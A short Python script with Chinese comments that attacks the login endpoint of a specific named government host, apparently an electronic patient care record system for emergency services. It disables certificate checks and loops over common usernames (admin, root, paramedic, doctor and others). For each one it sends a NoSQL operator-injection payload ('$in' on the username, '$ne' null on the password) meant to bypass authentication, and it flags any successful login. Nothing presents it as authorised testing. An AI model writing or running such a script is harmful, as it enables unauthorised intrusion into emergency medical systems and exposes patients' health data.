import json, ssl, urllib.request, urllib.error, time
CTX=ssl.create_default_context(); CTX.check_hostname=False; CTX.verify_mode=ssl.CERT_NONE
BASE="https://epcr.tpf.gov.tw:4004"
def post_login(body_dict):
    body=json.dumps(body_dict).encode()
    req=urllib.request.Request(BASE+"/login",data=body,method="POST",
        headers={"Content-Type":"application/json","User-Agent":"Mozilla/5.0"})
    try:
        r=urllib.request.urlopen(req,timeout=12,context=CTX); return r.status, r.read().decode("utf-8","replace")
    except urllib.error.HTTPError as e: return e.code, e.read().decode("utf-8","replace")
    except Exception as e: return None, repr(e)

# $in 匹配特定用户名 → 若该用户名存在且有 source 权限 → 可能 200
common_users=["admin","administrator","root","test","user","operator","dispatcher","rescuer","medic","paramedic","epcr","tpf","taipei","ambulance","999","119","operator1","admin1","manager","supervisor","director","chief","doctor","nurse"]
print("=== $in 单用户名测试 (找 source 允许登录的用户) ===")
for u in common_users:
    body={"username":{"$in":[u]},"password":{"$ne":None},"captcha":"1","domain":"AUTH_SERVER"}
    code,b=post_login(body)
    mark=""
    if code==200: mark="  *** 200! ***"
    print(f"  {u:15s} -> {code} | {b[:100]}{mark}")
    time.sleep(0.1)
print("DONE")
